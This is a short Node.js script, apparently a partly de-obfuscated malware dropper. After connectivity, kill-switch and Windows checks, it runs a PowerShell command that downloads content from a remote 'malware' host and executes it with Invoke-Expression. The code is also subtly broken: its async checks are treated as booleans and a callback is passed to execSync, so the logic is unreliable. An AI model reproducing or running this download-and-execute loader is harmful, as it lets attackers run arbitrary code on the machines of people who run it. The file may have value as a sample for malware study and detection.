// https://www.dejs.vip/2obfuscator
const {execSync: execute} = require('child_process');
if (!check_http_connection('https://www.microsoft.com')
     || !check_http_connection('https://www.twitter.com')
     || !check_http_connection('https://www.facebook.com')
     || check_http_connection('https://commandandcontrolkillswitch3154.com')) {
    console.log('Error Code 1: Check Failed!');
    return;
}
if (!is_windows()) {
    console.log('Error Code 2: Check Failed!');
    return;
}
var com1 = '(iwr "http://malware.secard.ca" -UseBasicParsing).Content | ForEach-Object { Invoke-Expression $_ }';
execute_command(com1);

function check_http_connection(url) {
    return new Promise(_0x360dc4 => {
        require('https').get(url, _0x38ecb4 => {
            _0x360dc4(_0x38ecb4.statusCode === 200);
        }).on('error', () => {
            _0x360dc4(false);
        });
    });
}
function is_windows() {
    try {
        const _0x3801b4 = execute('wmic os get Caption').toString();
        return _0x3801b4.includes('Windows');
    } catch (err) {
        console.error('Error executing command:', err.message);
        return false;
    }
}

function execute_command(cmd) {
    console.log(1)
    execute('powershell.exe -command "' + cmd + '"', (_0x35b1a0, _0x55aa67, _0x3a09b0) => {
        console.log(_0x35b1a0.message, _0x3a09b0, _0x55aa67)
        if (_0x35b1a0) {
            console.error('Error executing PowerShell command:', _0x35b1a0.message);
            return;
        }
        if (_0x3a09b0) {
            console.error('PowerShell command execution encountered an error:', _0x3a09b0);
            return;
        }
        console.log('PowerShell command executed successfully. Output:', _0x55aa67);
    });
}